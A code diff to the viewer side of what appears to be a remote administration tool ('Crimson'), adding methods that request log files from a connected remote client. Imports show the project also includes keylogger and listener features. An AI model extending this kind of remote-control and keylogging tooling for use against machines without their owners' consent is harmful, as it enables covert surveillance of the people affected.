@@ -22,6 +22,7 @@ import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.List;
 
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
@@ -44,6 +45,9 @@ import com.subterranean_security.crimson.core.proto.Keylogger.RQ_KeyUpdate;
 import com.subterranean_security.crimson.core.proto.Listener.ListenerConfig;
 import com.subterranean_security.crimson.core.proto.Listener.RQ_AddListener;
 import com.subterranean_security.crimson.core.proto.Listener.RQ_RemoveListener;
+import com.subterranean_security.crimson.core.proto.Log.LogFile;
+import com.subterranean_security.crimson.core.proto.Log.LogType;
+import com.subterranean_security.crimson.core.proto.Log.RQ_Logs;
 import com.subterranean_security.crimson.core.proto.Login.RQ_Login;
 import com.subterranean_security.crimson.core.proto.Login.RQ_LoginChallenge;
 import com.subterranean_security.crimson.core.proto.Login.RS_LoginChallenge;
@@ -521,6 +525,37 @@ public enum ViewerCommands {
 			outcome.setResult(false).setComment("Error: " + e.getMessage());
 		}
 		return outcome.build();
+	}
+
+	public static LogFile getLog(int cid, LogType type) {
+		try {
+			Message m = ViewerRouter.routeAndWait(
+					Message.newBuilder().setRid(cid).setSid(Common.cvid).setRqLogs(RQ_Logs.newBuilder().setLog(type)),
+					3);
+
+			if (m != null) {
+				return m.getRsLogs().getLog(0);
+
+			}
+
+		} catch (InterruptedException e) {
+		}
+		return null;
+	}
+
+	public static List<LogFile> getLogs(int cid) {
+		try {
+			Message m = ViewerRouter.routeAndWait(
+					Message.newBuilder().setRid(cid).setSid(Common.cvid).setRqLogs(RQ_Logs.newBuilder()), 3);
+
+			if (m != null) {
+				return m.getRsLogs().getLogList();
+
+			}
+
+		} catch (InterruptedException e) {
+		}
+		return null;
 	}
 
 }
